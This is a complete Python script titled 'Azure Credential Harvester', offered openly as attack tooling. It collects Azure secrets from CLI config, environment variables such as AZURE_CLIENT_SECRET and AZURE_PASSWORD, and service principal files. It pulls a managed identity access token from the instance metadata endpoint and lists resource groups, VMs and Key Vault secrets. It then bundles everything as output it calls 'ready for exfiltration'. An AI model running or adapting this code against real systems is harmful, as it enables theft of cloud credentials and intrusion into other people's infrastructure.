#!/usr/bin/env python3
"""
Azure Credential Harvester
Extracts Azure credentials and configuration
"""

import os, json, re, subprocess
from pathlib import Path

def extract_azure_credentials():
    """Extract Azure credentials from various sources"""
    credentials = {}
    
    # 1. Azure CLI credentials
    azure_config_path = Path.home() / '.azure' / 'config'
    if azure_config_path.exists():
        with open(azure_config_path, 'r') as f:
            content = f.read()
            # Parse subscriptions
            subscriptions = re.findall(r'\[(.*?)\](.*?)(?=\[|$)', content, re.DOTALL)
            for sub_name, sub_content in subscriptions:
                if 'subscription' in sub_name.lower():
                    credentials['cli_subscription'] = {
                        'name': sub_name.strip(),
                        'id': re.search(r'id\s*=\s*(.*)', sub_content)
                    }
    
    # 2. Environment variables
    azure_env_vars = [
        'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
        'AZURE_SUBSCRIPTION_ID', 'AZURE_USERNAME', 'AZURE_PASSWORD'
    ]
    
    env_creds = {}
    for var in azure_env_vars:
        value = os.environ.get(var)
        if value:
            env_creds[var] = value
    
    if env_creds:
        credentials['environment'] = env_creds
    
    # 3. Managed Identity (if available on Azure VM)
    try:
        import urllib.request
        
        # Try to get token from Managed Identity
        req = urllib.request.Request(
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            headers={'Metadata': 'true'}
        )
        
        response = urllib.request.urlopen(req, timeout=2)
        token_data = json.loads(response.read().decode())
        
        credentials['managed_identity'] = {
            'access_token': token_data.get('access_token'),
            'expires_in': token_data.get('expires_in'),
            'resource': token_data.get('resource'),
            'token_type': token_data.get('token_type')
        }
    except:
        pass
    
    # 4. Service Principal files
    sp_files = ['/etc/azure/sp.txt', '/var/azure/credentials.json']
    for file_path in sp_files:
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                    if file_path.endswith('.json'):
                        credentials[f'service_principal_{os.path.basename(file_path)}'] = json.loads(content)
                    else:
                        credentials[f'service_principal_{os.path.basename(file_path)}'] = content
            except:
                pass
    
    return credentials

def enumerate_azure_resources():
    """Try to enumerate Azure resources"""
    resources = {}
    
    # This would require azure-cli or SDK
    # For now, check if az CLI is available
    try:
        # Get current subscription
        result = subprocess.run(['az', 'account', 'show'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            resources['current_subscription'] = json.loads(result.stdout)
        
        # List resource groups
        result = subprocess.run(['az', 'group', 'list'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            resource_groups = json.loads(result.stdout)
            resources['resource_groups'] = [rg['name'] for rg in resource_groups[:5]]  # Limit to 5
        
        # List VMs
        result = subprocess.run(['az', 'vm', 'list'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            vms = json.loads(result.stdout)
            resources['virtual_machines'] = [vm['name'] for vm in vms[:5]]
            
    except:
        resources['error'] = 'Azure CLI not available or failed'
    
    return resources

def check_for_key_vaults():
    """Check for accessible Key Vaults"""
    key_vaults = []
    
    try:
        result = subprocess.run(['az', 'keyvault', 'list'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            vaults = json.loads(result.stdout)
            for vault in vaults[:3]:  # Limit to 3
                vault_info = {
                    'name': vault.get('name'),
                    'resource_group': vault.get('resourceGroup'),
                    'location': vault.get('location')
                }
                
                # Try to list secrets
                try:
                    secret_result = subprocess.run(
                        ['az', 'keyvault', 'secret', 'list', '--vault-name', vault['name']],
                        capture_output=True, text=True, timeout=5
                    )
                    if secret_result.returncode == 0:
                        secrets = json.loads(secret_result.stdout)
                        vault_info['secrets_count'] = len(secrets)
                except:
                    pass
                
                key_vaults.append(vault_info)
    except:
        pass
    
    return key_vaults

def main():
    """Main execution"""
    print("[Azure Credential Harvester]")
    print("=" * 50)
    
    credentials = extract_azure_credentials()
    
    if credentials:
        print(f"\n[+] Found Azure credentials in {len(credentials)} sources:")
        
        for source, creds in credentials.items():
            print(f"\n  Source: {source}")
            if isinstance(creds, dict):
                for key, value in creds.items():
                    if 'token' in key.lower() or 'secret' in key.lower():
                        print(f"    {key}: {value[:20]}..." if value else f"    {key}: None")
                    else:
                        print(f"    {key}: {value}")
            else:
                print(f"    {creds}")
    else:
        print("\n[-] No Azure credentials found")
    
    # Enumerate resources
    print("\n[+] Enumerating Azure resources...")
    resources = enumerate_azure_resources()
    
    if 'error' not in resources:
        if 'current_subscription' in resources:
            sub = resources['current_subscription']
            print(f"\n  Current Subscription:")
            print(f"    Name: {sub.get('name')}")
            print(f"    ID: {sub.get('id')}")
        
        if 'resource_groups' in resources:
            print(f"\n  Resource Groups (first 5):")
            for rg in resources['resource_groups']:
                print(f"    - {rg}")
        
        if 'virtual_machines' in resources:
            print(f"\n  Virtual Machines (first 5):")
            for vm in resources['virtual_machines']:
                print(f"    - {vm}")
    else:
        print(f"\n  [!] {resources['error']}")
    
    # Check Key Vaults
    print("\n[+] Checking for Key Vaults...")
    key_vaults = check_for_key_vaults()
    
    if key_vaults:
        print(f"  Found {len(key_vaults)} Key Vaults:")
        for vault in key_vaults:
            print(f"    - {vault['name']} ({vault.get('secrets_count', '?')} secrets)")
    else:
        print("  No Key Vaults found or access denied")
    
    # Output for exfiltration
    result = {
        'credentials': credentials,
        'resources': resources,
        'key_vaults': key_vaults,
        'timestamp': __import__('time').time()
    }
    
    return json.dumps(result, indent=2)

if __name__ == "__main__":
    output = main()
    print("\n" + "=" * 50)
    print("[*] Output ready for exfiltration")
